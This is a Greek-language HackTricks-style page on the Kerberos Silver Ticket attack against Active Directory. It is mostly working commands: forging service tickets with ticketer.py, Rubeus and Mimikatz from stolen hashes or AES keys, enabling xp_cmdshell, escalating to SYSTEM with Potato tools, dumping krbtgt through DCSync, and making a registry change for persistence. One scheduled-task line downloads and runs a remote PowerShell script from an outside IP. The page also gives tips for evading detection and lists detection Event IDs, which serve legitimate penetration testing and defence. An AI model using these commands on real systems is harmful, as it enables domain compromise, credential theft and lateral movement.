# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Η επίθεση **Silver Ticket** περιλαμβάνει την εκμετάλλευση service tickets σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός service account**, όπως ενός computer account, για τη δημιουργία ενός πλαστού Ticket Granting Service (TGS) ticket. Με αυτό το πλαστό ticket, ένας attacker μπορεί να αποκτήσει πρόσβαση σε συγκεκριμένες υπηρεσίες του δικτύου, **υποδυόμενος οποιονδήποτε χρήστη**, με συνήθη στόχο την απόκτηση administrative privileges. Επισημαίνεται ότι η χρήση AES keys για τη δημιουργία πλαστών tickets είναι πιο ασφαλής και δυσκολότερο να εντοπιστεί.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Τα Silver Tickets είναι δυσκολότερο να εντοπιστούν από τα Golden Tickets, επειδή απαιτούν μόνο το **hash του service account** και όχι του krbtgt account. Ωστόσο, περιορίζονται στη συγκεκριμένη υπηρεσία που στοχεύουν. Επιπλέον, αρκεί απλώς η κλοπή του password ενός χρήστη.
Επιπλέον, αν παραβιάσετε το **password ενός account με SPN**, μπορείτε να χρησιμοποιήσετε αυτό το password για να δημιουργήσετε ένα Silver Ticket, υποδυόμενοι οποιονδήποτε χρήστη προς αυτή την υπηρεσία.

### Σύγχρονες αλλαγές στο Kerberos (AES-only domains)

- Οι ενημερώσεις των Windows που ξεκίνησαν στις **8 Νοεμβρίου 2022 (KB5021131)** ορίζουν από προεπιλογή τα service tickets να χρησιμοποιούν **AES session keys**, όπου είναι δυνατό, και καταργούν σταδιακά το RC4. Αναμένεται οι DCs να διατίθενται με το RC4 **απενεργοποιημένο από προεπιλογή έως τα μέσα του 2026**, επομένως η εξάρτηση από NTLM/RC4 hashes για silver tickets αποτυγχάνει ολοένα συχνότερα με `KRB_AP_ERR_MODIFIED`. Να εξάγετε πάντα **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) για το target service account.<sup>[[5]](#references)</sup>
- Αν το `msDS-SupportedEncryptionTypes` του service account είναι περιορισμένο σε AES, πρέπει να δημιουργήσετε το ticket με `/aes256` ή `-aesKey`. Το RC4 (`/rc4` ή `-nthash`) δεν θα λειτουργήσει, ακόμη και αν έχετε το NTLM hash.<sup>[[6]](#references)</sup>
- Τα gMSA/computer accounts κάνουν rotation κάθε 30 ημέρες. Κάντε dump το **τρέχον AES key** από LSASS, Secretsdump/NTDS ή DCsync πριν από τη δημιουργία του ticket.
- OPSEC: το προεπιλεγμένο ticket lifetime στα tools είναι συχνά **10 χρόνια**. Ορίστε ρεαλιστικές διάρκειες (π.χ. `-duration 600` λεπτά), για να αποφύγετε τον εντοπισμό λόγω ασυνήθιστα μεγάλων lifetimes.<sup>[[6]](#references)</sup>

Για τη δημιουργία tickets χρησιμοποιούνται διαφορετικά tools, ανάλογα με το λειτουργικό σύστημα:

### Σε Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Σε Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Η υπηρεσία CIFS επισημαίνεται ως συχνός στόχος για την πρόσβαση στο file system του θύματος, αλλά μπορούν επίσης να αξιοποιηθούν άλλες υπηρεσίες, όπως οι HOST και RPCSS, για tasks και WMI queries.

### Παράδειγμα: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Εάν διαθέτετε το NTLM hash (ή το AES key) ενός SQL service account (π.χ. sqlsvc), μπορείτε να δημιουργήσετε ένα TGS για το MSSQL SPN και να κάνετε impersonate οποιονδήποτε χρήστη στην SQL service. Στη συνέχεια, ενεργοποιήστε το xp_cmdshell για να εκτελέσετε εντολές ως το SQL service account. Εάν αυτό το token διαθέτει SeImpersonatePrivilege, κάντε chain ένα Potato για να κάνετε elevate σε SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Εάν το context που προκύπτει διαθέτει SeImpersonatePrivilege (συχνά ισχύει για service accounts), χρησιμοποιήστε ένα Potato variant για να αποκτήσετε SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Περισσότερες λεπτομέρειες σχετικά με την κατάχρηση του MSSQL και την ενεργοποίηση του xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Επισκόπηση των Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                         | Service Silver Tickets                                                     |
| --------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                     | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                     | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS:</p><p>WSMAN</p><p>RPCSS</p>     |
| WinRM                                   | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε απλώς να ζητήσετε: WINRM</p> |
| Scheduled Tasks                         | HOST                                                                       |
| Windows File Share, επίσης psexec       | CIFS                                                                       |
| LDAP operations, συμπεριλαμβανομένου του DCSync | LDAP                                                                  |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
| Golden Tickets                          | krbtgt                                                                     |

Χρησιμοποιώντας το **Rubeus**, μπορείτε να **ζητήσετε όλα** αυτά τα tickets χρησιμοποιώντας την παράμετρο:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **Δεν υπάρχει προηγούμενο 4768/4769 στο DC** για τον ίδιο client/service, κάτι που αποτελεί συνηθισμένη ένδειξη ότι ένα πλαστογραφημένο TGS παρουσιάστηκε απευθείας στο service.
- Ένα ασυνήθιστα μεγάλο ticket lifetime ή ένας μη αναμενόμενος τύπος encryption (RC4 όταν το domain επιβάλλει AES) ξεχωρίζει επίσης στα δεδομένα των 4769/4624.

## Persistence

Για να αποτρέψετε τα machines από το να αλλάζουν το password τους κάθε 30 ημέρες, ορίστε το `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ή μπορείτε να ορίσετε το `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` σε τιμή μεγαλύτερη από 30 ημέρες, ώστε να υποδεικνύει την περίοδο rotation κατά την οποία πρέπει να αλλάζει το password των machines.<sup>[[3]](#references)</sup>

## Κατάχρηση Service tickets

Στα παρακάτω παραδείγματα, ας υποθέσουμε ότι το ticket ανακτήθηκε με impersonation του λογαριασμού administrator.

### CIFS

Με αυτό το ticket θα μπορείτε να αποκτήσετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (εάν είναι exposed) και να αντιγράψετε αρχεία σε ένα τμήμα του remote filesystem, κάνοντας απλώς κάτι όπως:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στο host ή να εκτελέσετε arbitrary commands χρησιμοποιώντας το **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτήν την permission μπορείτε να δημιουργήσετε scheduled tasks σε remote υπολογιστές και να εκτελέσετε arbitrary commands:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα tickets μπορείτε να **εκτελέσετε WMI στο σύστημα-θύμα**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες σχετικά με το wmiexec** στην ακόλουθη σελίδα:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε να **αποκτήσετε πρόσβαση σε αυτόν** και ακόμη και να λάβετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Δείτε την ακόλουθη σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης σε έναν απομακρυσμένο host χρησιμοποιώντας winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι το **winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να αποκτήσετε πρόσβαση σε αυτόν.

### LDAP

Με αυτό το privilege μπορείτε να κάνετε dump τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα για το DCSync** στην ακόλουθη σελίδα:


{{#ref}}
dcsync.md
{{#endref}}


## Αναφορές

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos; - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Διαδικασία κωδικού πρόσβασης λογαριασμού μηχανήματος - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato διαδρομή](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Ενίσχυση ασφάλειας του Kerberos και κατάργηση του RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Τρέχουσες επιλογές του Impacket ticketer.py (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
